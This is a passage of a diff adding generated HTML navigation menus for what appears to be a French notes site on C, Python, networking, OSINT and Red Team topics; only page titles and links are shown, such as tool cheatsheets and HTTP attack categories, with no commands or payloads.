+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            C
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_1_1" id="__nav_4_1_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Bases
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Bases
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Boucles/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Boucles
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Conditions/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Conditions
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Fonctions/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Fonctions
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Pointeur/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pointeur
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Structure%20programme%20simple/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Structure programme simple
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Structures/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Structures
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Tableaux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tableaux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Variables%20et%20types/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Variables et types
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Python
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Python
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/Python/Bases/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bases
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Réseaux
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            Réseaux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/CIDR/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CIDR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Les différents réseaux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/OSI/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSI
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Topologies/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Topologies
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Osint
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Osint
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tools locaux
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            Tools locaux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Osint/Tools%20locaux/Webcams%20publiques/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Webcams publiques
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tools online
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            Tools online
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Osint/Tools%20online/Lieux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Lieux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Osint/Tools%20online/Personnes/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Personnes
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Red Team
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Red Team
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_1" id="__nav_6_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    1   Cheatsheet
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_1">
+            <span class="md-nav__icon md-icon"></span>
+            1   Cheatsheet
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_1_1" id="__nav_6_1_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Base de données
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Base de données
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/1%20-%20Cheatsheet/Base%20de%20donn%C3%A9es/MSSQL/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MSSQL
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/1%20-%20Cheatsheet/Base%20de%20donn%C3%A9es/MySQL/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MySQL
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_1_2" id="__nav_6_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Tools
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/1%20-%20Cheatsheet/Tools/Mimikatz/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mimikatz
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NetExec
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/1%20-%20Cheatsheet/Tools/Nmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nmap
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/1%20-%20Cheatsheet/Tools/PowerView/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PowerView
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/1%20-%20Cheatsheet/Tools/Rubeus/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Rubeus
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/1%20-%20Cheatsheet/Tools/SQLMap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQLMap
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_1_3" id="__nav_6_1_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Windows
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/1%20-%20Cheatsheet/Windows/Net/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Net
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/1%20-%20Cheatsheet/Windows/RPC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    RPC
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2   Services
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2">
+            <span class="md-nav__icon md-icon"></span>
+            2   Services
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_1" id="__nav_6_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    DNS
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            DNS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_2" id="__nav_6_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    FTP
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            FTP
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3" id="__nav_6_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    HTTP
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            HTTP
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumération générale
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/Reconnaissance%20de%20domaine/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reconnaissance de domaine
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/Verb%20Tampering/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Verb Tampering
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_4" id="__nav_6_2_3_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    CSRF
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            CSRF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/CSRF/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_5" id="__nav_6_2_3_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    DNS rebinding
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            DNS rebinding
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/DNS%20rebinding/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_6" id="__nav_6_2_3_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Drupal
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            Drupal
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/Drupal/Enum%C3%A9ration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumération
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_7" id="__nav_6_2_3_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    File upload
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_7">
+            <span class="md-nav__icon md-icon"></span>
+            File upload
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/File%20upload/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/File%20upload/Payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Payloads
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_8" id="__nav_6_2_3_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    IDOR
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_8">
+            <span class="md-nav__icon md-icon"></span>
+            IDOR
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_9" id="__nav_6_2_3_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Injection de commande
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_9">
+            <span class="md-nav__icon md-icon"></span>
+            Injection de commande
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/Payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Payloads
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_10" id="__nav_6_2_3_10_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Joomla
+  </span>
+  
+
